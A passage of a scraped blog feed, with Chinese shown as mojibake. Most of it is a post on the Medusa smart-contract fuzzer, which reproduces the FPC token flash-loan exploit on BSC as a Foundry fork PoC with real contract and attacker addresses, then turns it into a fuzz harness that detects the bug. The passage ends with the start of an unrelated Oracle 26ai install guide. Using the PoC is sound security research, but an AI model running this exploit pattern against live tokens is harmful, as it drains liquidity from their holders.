<li>property å½æ°ï¼å½æ°åç§°ä¸º <code>property_*</code> çå½æ°ï¼å¨å½æ°åç¼åéè¦æ£æ¥çä¸åéæ¡ä»¶ï¼æ¯å¦ææç¨æ·ä½é¢çæ»åå°äº totalSupplyï¼ã<br>
å ä¸º Medusa å¨ fuzzing çè¿ç¨ä¸­ï¼é¦åä¼æåçº¦ç <code>public</code>/<code>external</code> å½æ°é½å½æâå¯è°ç¨å¨ä½âï¼å®ä¼éæºç»åè¥å¹²ä¸ªå¬å±å½æ°ä½ä¸ºè°ç¨é¾ï¼æé¡ºåºè¿è¡è°ç¨ãå¨æ§è¡å®è°ç¨é¾åï¼ä¼è°ç¨ææç property å½æ°è¿è¡æ£æ¥ï¼å¦ææä»»æåè­¦æ¡ä»¶è¢«è§¦åï¼è¿å fuzz æåçç»æã</li>
</ul>
<blockquote>
<p>å¦æå­å¨ä¸éè¦å¨ fuzz è¿ç¨ä¸­è¢«ç´æ¥è°ç¨çå½æ°ï¼æ¯å¦ callback ç±»åå½æ°ï¼ï¼éè¦æ·»å æ£æ¥éå¶ï¼å¦æä¸æ»¡è¶³è°ç¨æ¡ä»¶ç´æ¥ returnï¼æ¯å¦ <code>msg.sender == POOL</code>ï¼ï¼å¦åä¼ revert ä»èæµªè´¹å¤§éçèµæºã</p>
</blockquote>
<h2 id="åçº¦ä»ç»">åçº¦ä»ç»</h2>
<p>é¦åï¼éè¦æ ¹æ® fuzz çåºæ¯éæ©ä¸åçç¼åæ¹æ¡ï¼</p>
<ol>
<li>å¦ææ¯æ¬å° fuzzï¼ä¸æ¶åå°é¾ä¸ç¶æãé£ä¹å¯ä»¥æ°å»ºä¸ä¸ª fuzz åçº¦ï¼å¯¹ç®æ åçº¦è¿è¡ç»§æ¿ï¼ç¶åç¼åç¸å³ç property å½æ°è¿è¡æ£æ¥ãtargetContracts éæ© fuzz åçº¦ã</li>
<li>å¦ææ¯ fork fuzzï¼éè¦å¨é¾ä¸ç¶æåºç¡ä¸è¿è¡ãé£ä¹å¯ä»¥æ°å»ºä¸ä¸ª fuzz åçº¦ï¼è®¾è®¡å¥½æéè¦çå¬å±å½æ°ï¼è´è´£è°ç¨ç®æ åçº¦çæ¯ä¸ªåè½ï¼ç¶åç¼åç¸å³ç property å½æ°è¿è¡æ£æ¥ãtargetContracts éæ© fuzz åçº¦ã</li>
</ol>
<blockquote>
<p>å¨ fork fuzz åºæ¯çå¬å±å½æ°ä¸­ï¼æ¯ä¸ªè¾å¥çåæ°é½ç± medusa æä¾ï¼ç±äºè¾å¥æ¯ååçï¼æä»¥è¦æå·¥åå¾å¤è¾å¥å¼åä¸­é´å¼çæ£æ¥ï¼ä¸ç¬¦åçç´æ¥ returnã</p>
</blockquote>
<h1 id="å®ææ¡ä¾">å®ææ¡ä¾</h1>
<p>æ¥ä¸æ¥éè¿ä¸ä¸ªæ¼æ´ä»£å¸çæ¡ä¾æ¥è¿è¡å®æåæï¼ç±äºæ¯åæ¬¡å°è¯ä½¿ç¨ Medusaï¼æä»¥éååäºè§£æ¼æ´ï¼åç¼åè½å¤å°æ¼æ´æµåºæ¥ç fuzz è§åçæ¹å¼è¿è¡ã</p>
<h2 id="æ¡ä¾ä»ç»">æ¡ä¾ä»ç»</h2>
<p>æ¡ä¾éç¨çæ¯æä»¬ä¹ååè¿åæç <a href="https://www.cnblogs.com/ACaiGarden/p/19458550" title="FPC Token æ»å»äºä»¶" target="_blank">FPC Token æ»å»äºä»¶</a></p>
<p>FPC æ¯ BPE-20 é¡¹ç®ï¼å®ç°äºå¤æçäº¤ææºå¶ï¼åæ¬ä¹°åæç»­è´¹ãæµå¨æ§æ± çç§æºå¶ãéå¶äº¤æé¢çãéå¶äº¤ææ°éç­åè½ãæ¼æ´äº§ççåå æ¯å½ç¨æ·ååºä»£å¸æ¶ï¼åçº¦ä¼ä»æµå¨æ§æ± ä¸­çç§ä»£å¸ï¼èéä»ååºèä½é¢ä¸­çç§ï¼ï¼å¯¼è´æ± å­ä¸­ FPC ä»£å¸æ°éåå°ï¼ä»·æ ¼æ¬é«ã</p>
<p>æ»å»æµç¨å¦ä¸ï¼</p>
<ol>
<li>æ»å»èéè¿éªçµè´·è·å¾å¤§éç USDT</li>
<li>å¨ [FPC, USDT] æ± å­ä¸­è´­ä¹°å¤§éç FPC</li>
<li>æ FPC è½¬ç§»å°æ°çå°åä¸­</li>
<li>åºå®ææç FPCï¼åè§¦åæµå¨æ§æ± çç§æºå¶ï¼æ¨é«äº FPC çä»·æ ¼ï¼ç¶ååè®¡ç®åºå®è·å¾ç USDTï¼ä»èè·å¾è¶é¢çå©æ¶¦ã</li>
</ol>
<p><img src="https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260108195418546-1108887978.png" alt="image" loading="lazy"></p>
<h2 id="fuzz-åçº¦ç¼å">Fuzz åçº¦ç¼å</h2>
<p>é¦åå¤ç°äºè¿ä¸ªæ»å»ç PoCï¼ç¶åæ ¹æ® PoC æ¥ç¼å Medusa ç fuzz åçº¦ã</p>
<h3 id="poc">PoC</h3>
<p>ä½¿ç¨æ¶è¯·èªè¡æ¿æ¢ YOUR_RPC ä¸º RPC é¾æ¥ã</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

/// @notice Minimal interfaces used by this PoC (avoid importing full ABIs).
interface IPancakeV3PoolLike {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

/// @dev Kept for reference; this PoC uses `vm.startPrank/stopPrank`.
interface IStdCheats {
    // Sets the *next* call's msg.sender to be the input address
    function prank(address) external;

    // Sets all subsequent call's msg.sender (until stopPrank is called) to be the input address
    function startPrank(address) external;

    // Stops a previously called startPrank
    function stopPrank() external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function mint(address recipient, uint256 amount0, uint256 amount1) external;
    function burn(address to, uint256 amount0, uint256 amount1) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/// @title FPC exploit PoC (BSC mainnet fork)
/// @notice This test is a forked, on-chain PoC focusing on the transaction shape.
contract FPCExploitForkTest is Test {
    // ----------------------------
    // Constants (BSC mainnet)
    // ----------------------------
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant FPC = 0xB192D4A737430AA61CEA4Ce9bFb6432f7D42592F;

    /// @notice Pancake V3 pool used as the flash source (USDT/USDC pool).
    address public constant FLASH_POOL_ADDR = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant POOL = 0xa1e08E10Eb09857A8C6F2Ef6CCA297c1a081eD6B;

    /// @notice Attacker EOA (as observed on-chain).
    address public constant HACKER = 0xC2a81942627f6929521397eef6173F271D1fB456;

    /// @notice Flashloan amount used in the PoC (units: USDT 18 decimals on BSC).
    uint256 public constant FLASHLOAN_AMOUNT = 23020000 ether;

    /// @dev Fork to the target block height to match on-chain state at exploitation time.
    function setUp() public {
        vm.createSelectFork("YOUR_RPC", 52624700);
    }

    /// @notice Entry point: request a USDT flash and rely on the callback for execution.
    function test_exploit() public {
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        IERC20(FPC).approve(ROUTER, type(uint256).max);

        // 1. Flashloan USDT from Pancake V3 Pool
        IPancakeV3PoolLike(FLASH_POOL_ADDR).flash(address(this), FLASHLOAN_AMOUNT, 0, "0x00");
    }

    /// @notice Pancake V3 flash callback.
    /// @dev The body intentionally mirrors the PoC transaction sequence.
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // 2. Swap against target pool to acquire FPC
        IPancakeV3Pool(POOL).swap(1e18, 790178970489172772916652, address(this), "0x00");

        // 3. Transfer FPC to hacker EOA
        IERC20(FPC).transfer(HACKER, IERC20(FPC).balanceOf(address(this)));

        // 4. Sell FPC -&gt; USDT via router (as hacker)
        address[] memory sellPath = new address[](2);
        sellPath[0] = FPC;
        sellPath[1] = USDT;

        vm.startPrank(HACKER);
        IERC20(FPC).approve(ROUTER, type(uint256).max);
        IUniswapV2Router02(ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                247441170766403071054109, 0, sellPath, address(this), block.timestamp
            );
        vm.stopPrank();

        // 5. Repay flash + fee and log remaining USDT as profit
        uint256 repayAmount = FLASHLOAN_AMOUNT + fee0;
        IERC20(USDT).transfer(FLASH_POOL_ADDR, repayAmount);
        console.log("profit:", IERC20(USDT).balanceOf(address(this)));
    }

    /// @notice Pancake V2-style callback (for pool interactions).
    /// @dev Included to match the PoC behavior; sender/amount args are intentionally unused.
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        IERC20(USDT).transfer(POOL, 23020001000000000000000000);
    }
}

</code></pre>
<h3 id="fuzz-åçº¦">Fuzz åçº¦</h3>
<ul>
<li>fuzz_swap() å½æ°ç flashloanAmount åæ°æ¯ç± medusa æä¾çéæºå¼ã</li>
<li>pancakeV3FlashCallback å  pancakeCall å½æ°ä¸ºäºé¿åè¢«ç´æ¥è°ç¨ä¼å¨å¼å§æ¶æ£æ¥è°ç¨èï¼ä¸ç¬¦åçç´æ¥ return ä¸ä¸­æ­ fuzz sequence çè°ç¨ã</li>
</ul>
<p>ä¿å­å° <code>src/OnchainExploitDetector.sol</code> æä»¶ä¸­</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {console} from "forge-std/console.sol";

/// @notice Minimal interfaces used by this harness (avoid importing full ABIs).
interface IPancakeV3PoolLike {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IStdCheats {
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
}

/// @notice Minimal pool interface needed by the harness.
interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function mint(address recipient, uint256 amount0, uint256 amount1) external;
    function burn(address to, uint256 amount0, uint256 amount1) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/// @title Onchain exploit detector (Medusa/Property-based fuzz harness)
/// @notice Stateful harness that flags a post-repay positive USDT remainder.
/// @dev Medusa convention:
/// - `fuzz_*` functions are used as actions in generated call sequences
/// - `property_*` functions are checked as invariants/properties
contract OnchainExploitDetector {
    // ----------------------------
    // Addresses / dependencies (BSC mainnet)
    // ----------------------------
    IStdCheats cheats = IStdCheats(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant FPC = 0xB192D4A737430AA61CEA4Ce9bFb6432f7D42592F;

    /// @notice Pancake V3 pool used as flash source (USDT/USDC).
    address public constant FLASH_POOL_ADDR = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant POOL = 0xa1e08E10Eb09857A8C6F2Ef6CCA297c1a081eD6B;

    /// @notice Attacker EOA (as observed on-chain).
    address public constant HACKER = 0xC2a81942627f6929521397eef6173F271D1fB456;

    // ----------------------------
    // Fuzz state
    // ----------------------------
    uint256 private startUsdtBalance;
    bool private usdtNotIncreased;

    /// @dev Pre-approve router spending for this harness address to reduce fuzz noise.
    constructor() {
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        IERC20(FPC).approve(ROUTER, type(uint256).max);
    }

    /// @notice Fuzz action: take a flashloan and execute the swap path via callback.
    /// @param flashloanAmount Flash amount chosen by the fuzzer (USDT).
    function fuzz_swap(uint256 flashloanAmount) external {
        startUsdtBalance = IERC20(USDT).balanceOf(HACKER);
        // 1. Flashloan USDT from Pancake V3 Pool

        bytes memory data = abi.encode(flashloanAmount);
        IPancakeV3PoolLike(FLASH_POOL_ADDR).flash(address(this), flashloanAmount, 0, data);
    }

    /// @notice Pancake V3 flash callback.
    /// @dev Guarded by `msg.sender` to avoid arbitrary external driving of the sequence.
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        if (msg.sender != FLASH_POOL_ADDR) return;
        // 2. Buy FPC with USDT balance
        uint256 usdtAmount = IERC20(USDT).balanceOf(address(this));

        // Quote expected out amount for the buy, then swap against the target pool
        address[] memory path0 = new address[](2);
        path0[0] = USDT;
        path0[1] = FPC;
        uint256 buyAmount = usdtAmount - 1e18;
        uint256[] memory amounts = IUniswapV2Router02(ROUTER).getAmountsOut(buyAmount, path0);
        uint256 fpcAmount = amounts[1];

        IPancakeV3Pool(POOL).swap(1e18, fpcAmount, address(this), "0x00");

        // 3. Transfer FPC to Hacker
        IERC20(FPC).transfer(HACKER, IERC20(FPC).balanceOf(address(this)));

        // 4. Sell FPC back to USDT (as hacker)
        uint256 sellAmount = IERC20(FPC).balanceOf(HACKER);
        address[] memory path1 = new address[](2);
        path1[0] = FPC;
        path1[1] = USDT;

        cheats.startPrank(HACKER);
        IERC20(FPC).approve(ROUTER, type(uint256).max);
        IUniswapV2Router02(ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(sellAmount, 0, path1, address(this), block.timestamp);
        cheats.stopPrank();

        // 5. Repay Flashloan
        uint256 flashloanAmount = abi.decode(data, (uint256));
        uint256 repayAmount = flashloanAmount + fee0;
        uint256 currentBalance = IERC20(USDT).balanceOf(address(this));

        // If we cannot repay, the flashloan will revert at the pool level.
        if (currentBalance &lt; repayAmount) {
            return;
        }

        IERC20(USDT).transfer(FLASH_POOL_ADDR, repayAmount);

        // If any USDT remains after repayment, flag it for the property to catch.
        uint256 remainingBalance = IERC20(USDT).balanceOf(address(this));
        if (remainingBalance &gt; 0) {
            usdtNotIncreased = true;
        }
    }

    /// @notice Pancake V2-style callback.
    /// @dev Guarded by `msg.sender` to avoid arbitrary external driving of the sequence.
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender != POOL) return;
        uint256 usdtAmount = IERC20(USDT).balanceOf(address(this));
        IERC20(USDT).transfer(POOL, usdtAmount);
    }

    /// @notice Medusa property: must never observe a post-repay positive USDT remainder.
    /// @dev If `usdtNotIncreased` flips true, we intentionally fail to surface the counterexample.
    function property_user_usdt_not_increased() external view returns (bool) {
        if (usdtNotIncreased) assert(false); // alert
        return true;
    }
}
</code></pre>
<p>æ§è¡ <code>medusa fuzz --config medusa.onchain.json</code> å½ä»¤å¼å§æ§è¡<br>
<img src="https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260130234551288-1061933284.png" alt="image" loading="lazy"></p>
<p>è¿è¡æ¯ Medusa fuzz è¿è¡æ¶çå®æ¶ç»è®¡ï¼åå­æ®µå«ä¹å¦ä¸ï¼ä»¥ä¸é¢è¿æ¡ä¸ºä¾ï¼ï¼</p>
<blockquote>
<p>fuzz: elapsed: 2m12s, calls: 336480 (2531/sec), seq/s: 50, branches hit: 1115, corpus: 3, failures: 0/6725, gas/s: 2422662009</p>
</blockquote>
<ul>
<li><code>elapsed: 2m12s</code>ï¼å·²è¿è¡æ¶é´ã</li>
<li><code>calls: 336480 (2531/sec)</code>ï¼ç´¯è®¡æ§è¡äº 336,480 æ¬¡âåçº¦è°ç¨âï¼åæ¬¡ fuzz éå¯¹æä¸ªå½æ°çä¸æ¬¡è°ç¨ï¼ï¼æ¬å·éæ¯å¹³åæ¯ç§ calls æ°ã</li>
<li><code>seq/s: 50</code>ï¼æ¯ç§çæ/æ§è¡çâè°ç¨åºåâï¼call sequenceï¼æ°éãä¸ä¸ªåºåéä¼åå«å¤æ¬¡ callsï¼ç± callSequenceLength ç­éç½®å½±åï¼ã</li>
<li><code>branches hit: 1115</code>ï¼å½åè¦çå°çåæ¯æ°éï¼coverage çä¸ä¸ªææ ï¼è¶é«è¯´ææ¢ç´¢å°çè·¯å¾è¶å¤ï¼ã</li>
<li><code>corpus: 3</code>ï¼å½åä¿å­çâææè¾å¥æ ·æ¬âæ°éï¼è½å¸¦æ¥æ°è¦çææ´ä¼è·¯å¾ç seed/åºåä¼è¿å¥ corpusï¼ä¾åç»­åå¼ï¼ã</li>
<li><code>failures: 0/6725</code>ï¼å¤±è´¥æ°é/å¤±è´¥æ»æ¬¡æ°ãä½ è¿éè¡¨ç¤º 0 ä¸ªâå¯¼è´æµè¯å¤±è´¥çç¨ä¾âï¼ä½æé´ä¸å±åçè¿ 6725 æ¬¡éè´å½å¤±è´¥/åéï¼revert/invalidï¼ è¢«è®°å½ï¼éå¸¸ä¸ç® test failureï¼é¤éè§¦åäºæ­è¨å¤±è´¥æéç½®ä¸ºå¤±è´¥å³åï¼ã</li>
<li><code>gas/s: 2422662009</code>ï¼æ¯ç§æ¶èç gas æ»éï¼ååéææ ï¼è¶é«éå¸¸è¡¨ç¤ºæ§è¡æ´âéâææ´å¿«ï¼ã</li>
</ul>
<p>å½ fuzz åºåäº property çåè­¦æ¡ä»¶åï¼ä¼æ¾ç¤ºç¸å³çåå®¹ï¼åæ¬ fuzz traceï¼property traceï¼reportã</p>
<p><img src="https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260130234958182-1914923454.png" alt="image" loading="lazy"></p>
<ul>
<li>fuzz traceï¼è½å¤è§¦ååè­¦ç Call trace</li>
<li>property traceï¼è§¦åçç¸å³åè­¦</li>
<li>reportï¼fuzz æåµçæ¥åï¼åæ¬è¦ççï¼debug çæ¶åä¹ç¨å¾ä¸ï¼</li>
</ul>
<h2 id="fuzz-æ¥å">Fuzz æ¥å</h2>
<p>æå¼ <code>crytic-export/coverage/coverage_report.html</code> æ¥ç Fuzz æ¥å<br>
è¦ççè¾¾å°äº 91.7 %ï¼ç»¿è²é¨åä»£ç æ¯å¨ fuzz è¿ç¨ä¸­è¢«è°ç¨å°çï¼çº¢è²åæ¯æ²¡æè¢«è°ç¨ã<br>
<img src="https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260130235059363-377064041.png" alt="image" loading="lazy"></p>
<h1 id="å¤çä¸ææ">å¤çä¸ææ</h1>
<blockquote>
<p>Qï¼ä¸ºä»ä¹éç¨æ¨¡ä»¿ PoC çæ¹å¼ç¼å fuzz å½æ°ï¼èä¸æ¯ä»¥æ´éç¨çæ¹å¼ç¼å fuzz å½æ°ï¼<br>
Aï¼ä¸å¼å§æ¯ä»¥æ´éç¨çæ¹å¼ç¼åç fuzz å½æ°ï¼ä½æ¯ä¸ç´ fuzz ä¸åºæ¥ç»æï¼è¦ççä¹æå¼å¸¸ã</p>
</blockquote>
<p>å ä¸ºä¸å¼å§æ¯ç´æ¥å´ç»ç FPC Token æ»å»äºä»¶åæææ¡£ä¸­ç rootcause âæµå¨æ§çç§æºå¶âæ¥ç¼å fuzz å½æ°çãå¨é¡¹ç®ç±»åæç¡®ï¼æ¼æ´åçæºå¶æ¸æ¥çæåµä¸ï¼ååºæ¥ç fuzz å½æ°ä¾æ§æ æ³å¾å°ç»æã</p>
<blockquote>
<p>Worker = 8ï¼è·äºä¸¤ä¸ªå°æ¶ï¼æºå¨å·²ç»åç­å¾ç«æäºï¼æ²¡æç»§ç»­è·ä¸å»äºãå¤çååç°æå½æ¶ fuzz å½æ°çåæ³æ¯æ°¸è¿è·ä¸åºç»æç......</p>
</blockquote>
<p>éååªè½åå¤ç° PoCï¼åæ ¹æ® PoC æ¥å fuzz å½æ°ãèå¨å¤ç°çè¿ç¨ä¸­åç°äºæ¼æ´çæ´å¤ç»èï¼æ¯ç¬¬ä¸éåæçæ¶åæ²¡æçæå°çã</p>
<p>ç±äºè¿ä¸ªä»£å¸é¤äºææå¤§è´­ä¹°é¢åº¦çéå¶ãè¿æè´­ä¹°é¢ççéå¶ï¼é»å®¢éè¿ä¸äºå¾å·§å¦çæä½ç»è¿äºè¿ä¸¤ä¸ªæºå¶ã</p>
<ol>
<li>ç»è¿æå¤§è´­ä¹°é¢åº¦çéå¶ï¼ç´æ¥éè¿ pool å¤§éè´­ä¹° FPC æ¶åæ¶æ¢åº 1 ä¸ª USDTï¼ç®çå°±ä¸ºäºæ¬ºéª _isLiquidity å½æ°çæ£æ¥ï¼ä¼ªè£æç§»é¤æµå¨æ§çæä½ï¼ç»è¿äºæå¤§è´­ä¹°é¢åº¦çéå¶ã<pre><code>CALLCake-LP.swap(amount0Out=1,000,000,000,000,000,000, amount1Out=790,178,970,489,172,772,916,652)
</code></pre>
</li>
<li>ç»è¿è´­ä¹°é¢ççéå¶ï¼è´­ä¹°é¢çéå¶äºè·ç¦»ä¸æ¬¡ä¹°åæä½ä¸ä¸ªåºååæå¯ä»¥åæ¬¡ä¹°åï¼é»å®¢å¨è´­ä¹°å°äºå¤§é FPC ä»£å¸åï¼å°å¶ transfer ç»äºå¦ä¸ä¸ªå°åè¿è¡ååºï¼å¨ trace æªå¾ç 32 è¡ï¼ï¼ç»å¼äºè¿ä¸ªéå¶ã</li>
</ol>
<blockquote>
<p>æä»¥å¨èèéç¨æ§çåæä¸ç¼åå¯ç¨ç fuzz å½æ°æ¶ï¼éè¦æ·±å¥ç ç©¶ä»£ç ï¼äºè§£é¡¹ç®ææ¶åçæææºå¶ã</p>
</blockquote>
<p>éè¦æåè®®è¿è¡è¿ç¨ä¸­æææ¶åçåå®¹é½èèè¿å»ï¼åæ¬ä½ä¸éäºï¼</p>
<ol>
<li>åè®®æ¬èº«çææå½æ°è°ç¨</li>
<li>åè®®ç¸å³çç¹æå°å</li>
<li>ä¸åè®®ç¸å³çææåçº¦ï¼ä»ä»¬çææå½æ°è°ç¨ï¼çè³ç¸å³åçº¦çç¸å³åçº¦ï¼</li>
<li>åºåé¾çç¶ææ¹å</li>
</ol>
<blockquote>
<p>Qï¼é£ä¹æåªäºåºæ¯éåä½¿ç¨ fuzz è¿è¡æ¼æ´åæå¢ï¼</p>
</blockquote>
<p>æ ¹æ®å¯¹ Medusa çä½¿ç¨ä½éªä¸ fuzz å½æ°ç¼åè¦æ±æ¥çï¼fuzz å¯è½æ´éç¨äºåºç¨å¨æ°å­¦è®¡ç®æ¹é¢ãç¨æ¥è§£å³âæè§å¾è¿éå¯è½æè¾¹ç¼åºæ¯çé®é¢ï¼ä½æ¯ææ²¡åæ³ä¸¾åºæ¥ä¸ä¸ªä¾å­âçå°å¢ï¼æ¯å¦è¯´æ¶çæ²çº¿ï¼æµå¨æ§æ²çº¿ï¼ä»½é¢æ¯ä¾ï¼åè´·æ¯ä¾ç­ã<br>
è¿ä¸ç¹å¨å®æ¹ææ¡£ä¸­ä¹æææå<br>
<img src="https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260131000300946-400530903.png" alt="image" loading="lazy"></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.00625" data-date-updated="2026-01-31 00:13">2026-01-31 00:04</span>&nbsp;
<a href="https://www.cnblogs.com/ACaiGarden">ACai_sec</a>&nbsp;
éè¯»(<span id="post_view_count">13</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19556121);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19556121', targetLink: 'https://www.cnblogs.com/ACaiGarden/p/19556121', title: 'Medusa - æºè½åçº¦ Fuzzing å·¥å·ä»ç»ä¸æ¡ä¾è®²è§£' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ AIå¼åèå¦ä½æ çé¨ç½²Oracle AI Database 26aiç¯å¢ ]]></title>
    <link>https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa</link>
    <guid>87d280aa7241f0724f6b66ac3b303e71</guid>
    <description>
    <![CDATA[ 
    <a name="top"></a>
    <h2><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa" title="åå¸äº 2026-01-30 23:05">
    <span role="heading" aria-level="2">AIå¼åèå¦ä½æ çé¨ç½²Oracle AI Database 26aiç¯å¢</span>
    

</a>
</h2>
    <small>
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-30 23:05">2026-01-30 23:05</span>&nbsp;
<a href="https://www.cnblogs.com/jyzhao">AlfredZhao</a>&nbsp;
éè¯»(<span id="post_view_count">28</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19556062);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19556062', targetLink: 'https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa', title: 'AIå¼åèå¦ä½æ çé¨ç½²Oracle AI Database 26aiç¯å¢' })">ä¸¾æ¥</a>
</small>
    <div class="entry">
        <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>Oracle AI Database 26aiåå¸åï¼çå°å¾å¤DBAå¼å§å¿ç¢èµ·æ¥ï¼ç¬¬ä¸æ­¥å°±æ¯å»å®è£åç§å¤æé«å¯ç¨ç¯å¢ã</p>
<p>26aiä½ä¸ºAIåççæ°æ®åºåº§ï¼è¢«å¸å¼çä¸æ­¢ä¼ ç»DBAï¼å¾å¤AIå¼åèä¹æ©å°±æ³èªå·±è¯è¯å®äºã</p>
<p>å¦æåªæ¯ç¨äºå¼åæµè¯ï¼å¶å®æ²¡å¿è¦å»æ±DBAç»è£æ­£è§çRAC+ADGç¯å¢ï¼èåæºçè¯ï¼å¶å®ä¹ä¸å¿èªå·±æè¾åDBAé£æ ·å¤æçå®è£ï¼ç´æ¥éç¨rpmçæ¹å¼å®è£å°±è¶³å¤ã</p>
<p><strong>åææ¡ä»¶ï¼</strong> ä½ è¦æä¸ä¸ªæµè¯ç¯å¢ï¼æèæ¯èªå·±çèææºï¼ä¸é¢å®è£å¥½äºOEL8æä»¥ä¸çæä½ç³»ç»ï¼éç½®å¥½DNFæºæ¹ä¾¿å®è£ä¾èµåã</p>
<p>ç¶åå°±è·éç¬èè¯è¯å¦ä½å¿«éå®è£é¨ç½²rpmåå½¢å¼çOracle 26aiå§ã</p>
<h2 id="01--åå¤é¶æ®µ">01 | åå¤é¶æ®µ</h2>
<p>ä¸è½½Oracle RPMç¸å³ä»è´¨ï¼</p>
<ul>
<li><a href="https://www.oracle.com/database/technologies/oracle26ai-linux-downloads.html" target="_blank" rel="noopener nofollow">https://www.oracle.com/database/technologies/oracle26ai-linux-downloads.html</a></li>
</ul>
<p>æ ¹æ®ç¯å¢éæ©ä½ éè¦ä¸è½½çä»è´¨ï¼ç¬èè¿éæ¯OEL8.10ï¼æä»¥éæ©OEL8æå¯¹åºçä¼ä¸çæ°æ®åºè½¯ä»¶çrpmä»¥åç¸å³ä¾èµåçrpmã</p>
<p><img src="https://img2024.cnblogs.com/blog/635610/202601/635610-20260130230509231-1779229285.jpg" alt="" loading="lazy"></p>
<p>ä¸è½½å®ææ¯è¿ä¸¤ä¸ªrpmåï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/635610/202601/635610-20260130230508939-35914157.jpg" alt="" loading="lazy"></p>
<h2 id="02--å®è£ä¾èµå">02 | å®è£ä¾èµå</h2>
<p>ç´æ¥ä½¿ç¨rootç¨æ·æèsudoæä½ï¼dnfå®è£preinstallè¿ä¸ªrpmåï¼ä¼å°ææä¾èµååä¸äºåºç¡ç³»ç»åæ°éç½®å¨é¨èªå¨åæå®ã</p>
<pre><code class="language-bash">$ sudo dnf install oracle-ai-database-preinstall-26ai-1.0-1.el8.x86_64.rpm
</code></pre>
<h2 id="03--å®è£æ°æ®åºè½¯ä»¶">03 | å®è£æ°æ®åºè½¯ä»¶</h2>
<pre><code class="language-bash">$ sudo dnf install oracle-ai-database-ee-26ai-1.0-1.el8.x86_64.rpm

[SEVERE] The install cannot proceed because ORACLE_BASE directory (/opt/oracle)
is not owned by "oracle" user. You must change the ownership of ORACLE_BASE
directory to "oracle" user and retry the installation.

error: %prein(oracle-ai-database-ee-26ai-1.0-1.x86_64) scriptlet failed, exit status 1

Error in PREIN scriptlet in rpm package oracle-ai-database-ee-26ai
